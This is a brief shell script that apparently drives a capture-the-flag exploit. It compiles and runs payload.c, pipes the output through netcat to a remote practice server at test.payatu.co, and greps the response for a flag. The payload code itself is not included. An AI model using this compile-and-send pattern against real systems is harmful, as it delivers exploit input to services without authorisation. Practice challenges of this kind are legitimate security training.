#! /bin/sh

gcc payload.c -w
./a.out > payload
rm ./a.out
nc test.payatu.co 44444 < payload > log
cat log | grep flag
head -n 4 log | grep flag
rm log